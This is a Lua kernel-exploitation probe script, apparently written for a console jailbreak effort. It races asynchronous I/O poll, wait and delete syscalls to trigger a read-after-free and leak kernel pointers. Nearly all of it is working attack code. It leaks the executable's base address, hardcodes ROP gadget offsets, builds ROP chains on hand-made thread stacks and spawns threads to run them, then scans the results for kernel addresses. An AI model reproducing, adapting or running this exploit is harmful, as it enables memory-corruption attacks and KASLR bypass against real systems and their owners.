-- CRASH_CLASS: HIGH
-- PROBE 69o: AIO poll(664) vs close(662) race for dangling pointer
--
-- Read-after-free race: poll reads AIO sub-object AFTER delete freed it.
-- R+0x00/R+0x08 contain kernel thread pointers not zeroed before free.
-- Thread A: 662(ids, N, states) frees R, I, Q
-- Thread B: 664(ids, N, states) reads status from live objects
-- NEVER call 670 (aio_init).

print("=== PROBE 69o: POLL(664) vs DELETE(662) RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL: no /dev/zero"); return end

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function make_gate()
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local r = rd(N(sp)) or -1
    local w = rd(N(sp) + 4) or -1
    return r, w
end

local del_ids   = memory.alloc(4 * BATCH + 0x10)
local states_D  = memory.alloc(4 * BATCH + 0x10)
local states_P  = memory.alloc(4 * BATCH + 0x10)
local marker_D  = memory.alloc(8)
local marker_P  = memory.alloc(8)
local tmp_D     = memory.alloc(8)
local tmp_P     = memory.alloc(8)
local wbyte     = memory.alloc(8)
wd(N(wbyte), 0x42)

local stk_D = memory.alloc(0x4000)
local stk_P = memory.alloc(0x4000)

print("")
print("-- [A] POLL(664) vs DELETE(662) RACE (30 iters) --")

local ITERS = 30
local total_anom = 0
local total_kptr = 0

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < 4 then
        print(string.format("  iter %d: only %d IDs", iter, #ids))
        break
    end

    local gate_rd_D, gate_wr_D = make_gate()
    local gate_rd_P, gate_wr_P = make_gate()
    if gate_rd_D < 0 or gate_rd_P < 0 then print("  gate fail"); break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_D) + i * 4, 0xDD)
        wd(N(states_P) + i * 4, 0xEE)
    end
    wq(N(marker_D), uint64(0))
    wq(N(marker_P), uint64(0))

    -- Child D (delete): marker -> gate -> 662 -> exit
    local sb_D = N(stk_D)
    for i = 0, 0x3FFC, 4 do wd(sb_D + i, 0) end
    local sp_d = sb_D + 0x2000 - ((sb_D + 0x2000) % 16) - 8
    local od = 0
    local function wdd(v) wq(sp_d + od, v); od = od + 8 end
    wdd(g_pop_rax); wdd(uint64(0xDD))
    wdd(g_pop_rdi); wdd(uint64(N(marker_D))); wdd(g_mov_m_rax)
    wdd(g_pop_rax); wdd(uint64(3))
    wdd(g_pop_rdi); wdd(uint64(gate_rd_D))
    wdd(g_pop_rsi); wdd(uint64(N(tmp_D)))
    wdd(g_pop_rdx); wdd(uint64(1)); wdd(stub)
    wdd(g_pop_rdi); wdd(uint64(N(del_ids)))
    wdd(g_pop_rsi); wdd(uint64(#ids))
    wdd(g_pop_rdx); wdd(uint64(N(states_D)))
    wdd(g_pop_rax); wdd(uint64(662)); wdd(stub)
    wdd(g_pop_rdi); wdd(uint64(0))
    wdd(g_pop_rax); wdd(uint64(431)); wdd(stub)

    -- Child P (poll): marker -> gate -> 664 -> exit
    local sb_P = N(stk_P)
    for i = 0, 0x3FFC, 4 do wd(sb_P + i, 0) end
    local sp_p = sb_P + 0x2000 - ((sb_P + 0x2000) % 16) - 8
    local op = 0
    local function wpp(v) wq(sp_p + op, v); op = op + 8 end
    wpp(g_pop_rax); wpp(uint64(0xEE))
    wpp(g_pop_rdi); wpp(uint64(N(marker_P))); wpp(g_mov_m_rax)
    wpp(g_pop_rax); wpp(uint64(3))
    wpp(g_pop_rdi); wpp(uint64(gate_rd_P))
    wpp(g_pop_rsi); wpp(uint64(N(tmp_P)))
    wpp(g_pop_rdx); wpp(uint64(1)); wpp(stub)
    wpp(g_pop_rdi); wpp(uint64(N(del_ids)))
    wpp(g_pop_rsi); wpp(uint64(#ids))
    wpp(g_pop_rdx); wpp(uint64(N(states_P)))
    wpp(g_pop_rax); wpp(uint64(664)); wpp(stub)
    wpp(g_pop_rdi); wpp(uint64(0))
    wpp(g_pop_rax); wpp(uint64(431)); wpp(stub)

    local pd = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pd) + i, 0) end
    wq(N(pd), g_bare_ret)
    wq(N(pd) + 0x10, uint64(sb_D))
    wq(N(pd) + 0x18, uint64(0x2000))

    local pp = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pp) + i, 0) end
    wq(N(pp), g_bare_ret)
    wq(N(pp) + 0x10, uint64(sb_P))
    wq(N(pp) + 0x18, uint64(0x2000))

    pcall(function() mk(455)(pd, uint64(0x38)) end)
    pcall(function() mk(455)(pp, uint64(0x38)) end)

    local d_rdy, p_rdy = false, false
    for w = 1, 500000 do
        if not d_rdy and N(rq(N(marker_D)) or uint64(0)) ~= 0 then d_rdy = true end
        if not p_rdy and N(rq(N(marker_P)) or uint64(0)) ~= 0 then p_rdy = true end
        if d_rdy and p_rdy then break end
    end
    if not (d_rdy and p_rdy) then
        print(string.format("  iter %d TIMEOUT d=%s p=%s", iter, tostring(d_rdy), tostring(p_rdy)))
        break
    end

    pcall(function() mk(4)(uint64(gate_wr_D), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gate_wr_P), uint64(N(wbyte)), uint64(1)) end)

    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  iter %d: CRASHED", iter)); break
    end

    local d_ok, p_ok = 0, 0
    local p_anom = 0
    local p_kptr = 0
    for i = 0, #ids - 1 do
        local sD = rd(N(states_D) + i * 4) or 0xDD
        local sP = rd(N(states_P) + i * 4) or 0xEE
        if sD == 0 then d_ok = d_ok + 1 end
        if sP ~= 0xEE then
            p_ok = p_ok + 1
            if sP >= 0xFFFF8000 and sP ~= 0xFFFFFFFF then
                p_kptr = p_kptr + 1
                print(string.format("  *** KPTR *** iter=%d i=%d poll=0x%08X id=0x%X",
                    iter, i, sP, ids[i + 1]))
            elseif sP ~= 0 and sP ~= 3 and sP ~= 4 and sP ~= 0x80020003 then
                p_anom = p_anom + 1
                if p_anom <= 5 then
                    print(string.format("  ANOM iter=%d i=%d poll=0x%08X id=0x%X",
                        iter, i, sP, ids[i + 1]))
                end
            end
        end
    end

    for i = 0, #ids - 1 do
        local qval = rq(N(states_P) + i * 4)
        if qval then
            local qh, ql = get_hi_lo(qval)
            if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                p_kptr = p_kptr + 1
                print(string.format("  *** KPTR-Q *** iter=%d i=%d val=%s", iter, i, fmt(qval)))
            end
        end
    end

    total_anom = total_anom + p_anom
    total_kptr = total_kptr + p_kptr
    local tag = ""
    if p_kptr > 0 then tag = " *** KPTR ***" end
    if p_anom > 0 then tag = tag .. " ANOM" end
    print(string.format("  iter %d: del_ok=%d poll_ok=%d anom=%d kptr=%d%s",
        iter, d_ok, p_ok, p_anom, p_kptr, tag))

    pcall(function() mk(6)(uint64(gate_rd_D)) end)
    pcall(function() mk(6)(uint64(gate_wr_D)) end)
    pcall(function() mk(6)(uint64(gate_rd_P)) end)
    pcall(function() mk(6)(uint64(gate_wr_P)) end)
end

print("")
print("-- [B] WAIT(663) vs DELETE(662) RACE (20 iters) --")

local wait_ids   = memory.alloc(4 * BATCH + 0x10)
local wait_st_D  = memory.alloc(4 * BATCH + 0x10)
local wait_st_W  = memory.alloc(8 * BATCH + 0x10)
local marker_WD  = memory.alloc(8)
local marker_WW  = memory.alloc(8)
local tmp_WD     = memory.alloc(8)
local tmp_WW     = memory.alloc(8)

local stk_WD = memory.alloc(0x4000)
local stk_WW = memory.alloc(0x4000)

for iter = 1, 20 do
    if not alive() then print("  DEAD at B iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < 4 then break end

    local gr_D, gw_D = make_gate()
    local gr_W, gw_W = make_gate()
    if gr_D < 0 or gr_W < 0 then break end

    for i = 0, #ids - 1 do
        wd(N(wait_ids) + i * 4, ids[i + 1])
        wd(N(wait_st_D) + i * 4, 0xDD)
        wq(N(wait_st_W) + i * 8, uint64(0xDEADDEADDEADDEAD))
    end
    wq(N(marker_WD), uint64(0))
    wq(N(marker_WW), uint64(0))

    local sb = N(stk_WD)
    for i = 0, 0x3FFC, 4 do wd(sb + i, 0) end
    local sp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    local o = 0
    local function w1(v) wq(sp + o, v); o = o + 8 end
    w1(g_pop_rax); w1(uint64(0xD1))
    w1(g_pop_rdi); w1(uint64(N(marker_WD))); w1(g_mov_m_rax)
    w1(g_pop_rax); w1(uint64(3))
    w1(g_pop_rdi); w1(uint64(gr_D))
    w1(g_pop_rsi); w1(uint64(N(tmp_WD)))
    w1(g_pop_rdx); w1(uint64(1)); w1(stub)
    w1(g_pop_rdi); w1(uint64(N(wait_ids)))
    w1(g_pop_rsi); w1(uint64(#ids))
    w1(g_pop_rdx); w1(uint64(N(wait_st_D)))
    w1(g_pop_rax); w1(uint64(662)); w1(stub)
    w1(g_pop_rdi); w1(uint64(0))
    w1(g_pop_rax); w1(uint64(431)); w1(stub)

    local sb2 = N(stk_WW)
    for i = 0, 0x3FFC, 4 do wd(sb2 + i, 0) end
    local sp2 = sb2 + 0x2000 - ((sb2 + 0x2000) % 16) - 8
    local o2 = 0
    local function w2(v) wq(sp2 + o2, v); o2 = o2 + 8 end
    w2(g_pop_rax); w2(uint64(0xE1))
    w2(g_pop_rdi); w2(uint64(N(marker_WW))); w2(g_mov_m_rax)
    w2(g_pop_rax); w2(uint64(3))
    w2(g_pop_rdi); w2(uint64(gr_W))
    w2(g_pop_rsi); w2(uint64(N(tmp_WW)))
    w2(g_pop_rdx); w2(uint64(1)); w2(stub)
    w2(g_pop_rdi); w2(uint64(N(wait_ids)))
    w2(g_pop_rsi); w2(uint64(#ids))
    w2(g_pop_rdx); w2(uint64(N(wait_st_W)))
    w2(g_pop_rax); w2(uint64(663)); w2(stub)
    w2(g_pop_rdi); w2(uint64(0))
    w2(g_pop_rax); w2(uint64(431)); w2(stub)

    local pd2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pd2) + i, 0) end
    wq(N(pd2), g_bare_ret)
    wq(N(pd2) + 0x10, uint64(N(stk_WD)))
    wq(N(pd2) + 0x18, uint64(0x2000))

    local pw2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pw2) + i, 0) end
    wq(N(pw2), g_bare_ret)
    wq(N(pw2) + 0x10, uint64(N(stk_WW)))
    wq(N(pw2) + 0x18, uint64(0x2000))

    pcall(function() mk(455)(pd2, uint64(0x38)) end)
    pcall(function() mk(455)(pw2, uint64(0x38)) end)

    local wd_rdy, ww_rdy = false, false
    for w = 1, 500000 do
        if not wd_rdy and N(rq(N(marker_WD)) or uint64(0)) ~= 0 then wd_rdy = true end
        if not ww_rdy and N(rq(N(marker_WW)) or uint64(0)) ~= 0 then ww_rdy = true end
        if wd_rdy and ww_rdy then break end
    end
    if not (wd_rdy and ww_rdy) then
        print(string.format("  B iter %d TIMEOUT", iter)); break
    end

    pcall(function() mk(4)(uint64(gw_D), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gw_W), uint64(N(wbyte)), uint64(1)) end)

    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  B iter %d: CRASHED", iter)); break
    end

    local w_kptr = 0
    local w_anom = 0
    for i = 0, #ids - 1 do
        local qval = rq(N(wait_st_W) + i * 8)
        if qval then
            local qh, ql = get_hi_lo(qval)
            if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                w_kptr = w_kptr + 1
                print(string.format("  *** B-KPTR *** iter=%d i=%d 663=%s", iter, i, fmt(qval)))
            elseif N(qval) ~= 0 and N(qval) ~= 0xDEADDEAD and N(qval) ~= 3 and N(qval) ~= 4 then
                w_anom = w_anom + 1
                if w_anom <= 5 then
                    print(string.format("  B-ANOM iter=%d i=%d 663=%s", iter, i, fmt(qval)))
                end
            end
        end
    end

    total_kptr = total_kptr + w_kptr
    total_anom = total_anom + w_anom
    local tag = ""
    if w_kptr > 0 then tag = " *** KPTR ***" end
    print(string.format("  B iter %d: kptr=%d anom=%d%s", iter, w_kptr, w_anom, tag))

    pcall(function() mk(6)(uint64(gr_D)) end)
    pcall(function() mk(6)(uint64(gw_D)) end)
    pcall(function() mk(6)(uint64(gr_W)) end)
    pcall(function() mk(6)(uint64(gw_W)) end)
end

pcall(function() mk(6)(uint64(fd_zero)) end)

print("")
print("=== SUMMARY ===")
print(string.format("  Total kernel pointers: %d", total_kptr))
print(string.format("  Total anomalies: %d", total_anom))
if total_kptr > 0 then
    print("  >>> KERNEL POINTER FOUND -- READ-AFTER-FREE CONFIRMED <<<")
end
print("=== PROBE 69o COMPLETE ===")
